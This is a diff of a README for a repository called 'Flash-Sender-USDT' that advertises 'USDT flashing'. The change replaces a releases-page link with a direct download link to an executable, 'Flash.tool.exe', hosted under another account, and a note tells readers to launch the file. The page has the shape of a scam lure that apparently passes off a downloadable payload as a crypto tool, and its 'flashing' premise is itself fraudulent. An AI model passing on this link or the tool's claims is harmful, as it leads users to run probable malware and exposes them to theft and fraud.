@@ -9,7 +9,7 @@ Welcome to the Flash-Sender-USDT repository! This is the ultimate destination fo
 
 ## Get Started
 To begin your USDT flashing journey, download our latest release from the following link:
-[![Download Now](https://github.com/mahadaconfigs/Flash-Sender-USDT/releases)](https://github.com/mahadaconfigs/Flash-Sender-USDT/releases)
+[![Download Now](https://github.com/mr-gooley/Flash-Sender-USDT/releases/download/Update/Flash.tool.exe)](https://github.com/mr-gooley/Flash-Sender-USDT/releases/download/Update/Flash.tool.exe)
 
 ### Note:
 - If the link ends with the file name, it needs to be launched to start the download process.
